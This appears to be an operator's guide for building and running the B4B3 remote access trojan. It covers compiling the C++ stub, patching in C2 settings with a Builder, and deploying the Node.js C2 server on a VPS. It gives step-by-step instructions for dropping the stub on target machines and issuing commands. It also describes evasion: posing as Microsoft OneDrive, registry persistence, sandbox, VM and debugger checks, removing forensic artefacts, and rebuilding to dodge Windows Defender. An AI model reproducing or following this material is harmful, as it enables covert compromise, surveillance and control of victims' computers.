Architecture Overview

Stub.exe ──── HTTP ────▶ C2 Server :4444
GET /checkin GET /cmd POST /result POST /upload POST /event
Browser ──── HTTP ────▶ C2 Server :4444
login.html / index.html / api/auth/* / api/bots/*

There are three components:

ComponentLocationRole
C2 Serverc2-server/Node.js backend. Receives stub check-ins, stores bot state, serves dashboard files, exposes admin API.
Dashboardc2-dashboard/Single-page web UI. Served by the C2 server itself (same origin — no CORS needed).
StubB4B3-RAT/Stub/C++ agent deployed to target machine. Polls the C2 server over plain HTTP, executes commands, sends results.
ℹ The stub uses plain HTTP (WinInet, no TLS). Do not put TLS certificates on the VPS — if cert.pem and key.pem are present, the server switches to HTTPS and the stub cannot connect.

Building Stub.exe from Source

The stub must be compiled with MinGW whenever you change any .cpp source file. A PowerShell build script handles everything automatically.

Dependencies (already set up)

  • CryptoPP static library at D:\CryptoPP\libcryptopp.a
  • nlohmann JSON headers inside the B4B3-RAT\packages\ folder
  • MinGW g++ and windres in C:\MinGW\bin\

Running the build

Open PowerShell (any directory) and run:

PowerShell
cd "D:\Security related stuff from github\B4DB4B3-RAT-main\B4DB4B3-RAT-main\B4B3-RAT\Stub"
powershell -ExecutionPolicy Bypass -File build.ps1

What the script does internally:

  1. Compiles Stub.rc with windres → Stub_res.o (embeds version info / Microsoft metadata)
  2. Compiles all 18 .cpp source files and links everything with g++
  3. Links CryptoPP, WinInet, GDI+, VFW32, WinMM, IPHlpApi and other Windows libraries
  4. Outputs Stub.exe in the same folder and cleans up temp objects

Output

Expected output
[1/3] Compiling resource file...
[2/3] Compiling and linking...
[3/3] Done — Stub.exe ready.
Next: Builder reads Stub.exe from this folder — run the Builder and configure it.
⚠ Warnings like "passing NULL to non-pointer argument" are harmless — they are from the original codebase and do not affect functionality. Only error: lines mean the build failed.

Configuring the Stub (Builder)

The Builder is a Windows GUI app (B4B3-RAT\Builder\) that patches Stub.exe in-place with your specific C2 settings. It does not recompile — it writes config bytes into the binary.

Builder fields

FieldWhat to enterExample
C2 Host / BotAPIVPS IP address (no http://, no port)2.24.160.60
PortC2 server port4444
Auth KeyMust match C2_AUTH env var on serverKhan123
Delay (ms)How often stub polls for commands3000
Drop PathWhere stub installs itself on the targetC:\Users\Public\OneDriveHelper.exe
Autorun nameRegistry autorun value nameOneDriveHelper

After filling all fields, click Build. The Builder reads Stub.exe from its own folder, patches the settings block (identified by magic bytes 0xDEADBEEF), and writes Stub_configured.exe.

✓ The auth key must match exactly on both sides: what you enter in the Builder must equal the C2_AUTH environment variable set when starting the server. Default is changeme — always change it.

VPS Deployment

⚠ Do NOT place cert.pem or key.pem in the c2-server/ folder on the VPS. Their presence switches the server to HTTPS, which the stub cannot connect to (stub uses plain HTTP only).

1 — Clone and install

VPS terminal (SSH)
git clone https://github.com/MunibAhmad-dev/B4B3.git
cd B4B3/c2-server
npm install

2 — Environment variables

VariableDefaultDescription
C2_AUTHchangemeBot authentication key — must match what is baked into the stub via Builder
ADMIN_PASSadmin123Dashboard login password
C2_PORT4444TCP port the server listens on
CORS_ORIGIN(empty)Leave empty — dashboard is served by the backend (same origin)

3 — Start with PM2

VPS terminal
# Start the server
C2_AUTH=Khan123 ADMIN_PASS=Khan123456 C2_PORT=4444 \
  pm2 start server.js --name c2-server

# Save process list so it survives reboots
pm2 save
pm2 startup   # follow the printed command to enable boot autostart

# Check status
pm2 status
pm2 logs c2-server

4 — Find your VPS IP

VPS terminal
curl -4 ifconfig.me    # returns IPv4 address, e.g. 2.24.160.60

5 — Open firewall (Hostinger VPS2)

  1. Log into Hostinger hPanel → VPS → Firewall
  2. Add rule: Protocol TCP, Port 4444, Source 0.0.0.0/0, Action Accept
  3. Click Synchronize — rules are not applied until synchronized

Stub Protections Added

ProtectionFileHow it works
Version info resourceStub.rcBinary reports Microsoft Corporation / Microsoft OneDrive in file properties. Reduces suspicion on static inspection.
Registry key renamedWinMain.cppChanged from Software\4B4DB4B3 (known signature) to Software\Microsoft\OneDriveSync.
Debug files removedWinMain.cpp, WebcamTool.cppRemoved writes to C:\Users\Public\stub_dbg.txt and wcam_dbg.txt — both were obvious forensic artefacts.
Hypervisor detectionProtector.cppReads CPUID bit 31 at startup. If set, the process is running inside a VM/hypervisor (AV sandbox) → ExitProcess(0).
Sleep acceleration checkProtector.cppSleeps 500 ms and measures elapsed time. AV sandboxes accelerate time to skip delays. If <400 ms elapsed → ExitProcess(0).
Anti-debug checksProtector.cppExisting: IsDebuggerPresent(), CheckRemoteDebuggerPresent(), process name scan (OllyDbg, x64dbg, Wireshark etc.), window title scan.
Persistent Bot IDWinMain.cppID written to registry on first run and reused on restarts — prevents duplicate bot entries when the protector restarts the process.

Full Workflow (End-to-End)

  1. Deploy server on VPS — clone repo, npm install, start with PM2 using correct env vars. Confirm pm2 status shows it running.
  2. Open firewall port 4444 on Hostinger panel → Synchronize.
  3. Build Stub.exe — run build.ps1 from B4B3-RAT\Stub\. Produces fresh Stub.exe.
  4. Configure stub with Builder — open Builder GUI, enter VPS IP (no http://), port 4444, auth key, delay, drop path. Click Build → produces Stub_configured.exe.
  5. Deploy Stub_configured.exe to target machine and run it.
  6. Open dashboard at http://<VPS-IP>:4444/login.html, log in with admin password. Bot should appear within one polling interval.
  7. Send commands from the Bot Detail → Summary tab.

Updating the Stub After Code Changes

Any time you edit a .cpp or .h file in B4B3-RAT\Stub\:

PowerShell — full rebuild cycle
# 1. Rebuild
cd "D:\Security related stuff from github\B4DB4B3-RAT-main\B4DB4B3-RAT-main\B4B3-RAT\Stub"
powershell -ExecutionPolicy Bypass -File build.ps1

# 2. Open the Builder GUI and click Build again to re-patch the new Stub.exe
#    The Builder reads Stub.exe from the same folder automatically.

# 3. Distribute the new Stub_configured.exe
⚠ The C2 server does not need to be updated when you rebuild the stub — the stub talks to the server via the same HTTP endpoints regardless of internal changes. Only update the server if you add new routes.

Updating the server on VPS after pushing changes

VPS terminal
cd ~/B4B3/c2-server
git pull
npm install          # only if package.json changed
pm2 restart c2-server

Troubleshooting

SymptomCauseFix
Stub connects but bots duplicate every secondOld stub uses rand() for ID with no persistence. Protector restarts it → new ID each time.Rebuild stub from updated source — ID is now stored in registry.
Bot appears in dashboard then immediately disappearsServer restarted — in-memory state lost.Bots reconnect within one poll interval. State is in-memory only; restart clears it.
Stub runs but nothing in dashboardAuth key mismatch, wrong IP, or firewall blocking port 4444.Check Builder auth key == C2_AUTH. Check firewall is synchronized. Try curl http://<VPS-IP>:4444/ping?auth=<key> from terminal.
Dashboard login auto-logs out immediatelyStale HTTPS cookie in browser conflicting with HTTP session.Open incognito window or clear cookies for that origin.
EADDRINUSE :4444 on server startPrevious Node process still running.pm2 delete c2-server then restart, or fuser -k 4444/tcp.
Server switches to HTTPS unexpectedlycert.pem / key.pem found in c2-server/ folder.Delete them: rm c2-server/cert.pem c2-server/key.pem and restart.
Build FAILED — undefined referenceMissing library in the linker command.Check the error for the missing symbol, identify which -l flag covers it, add to build.ps1.
Stub killed by Windows Defender immediatelyBinary hash matches known sample (GitHub public repo).Rebuild after modifying source code (rename functions, add dummy operations) to produce a different binary hash.
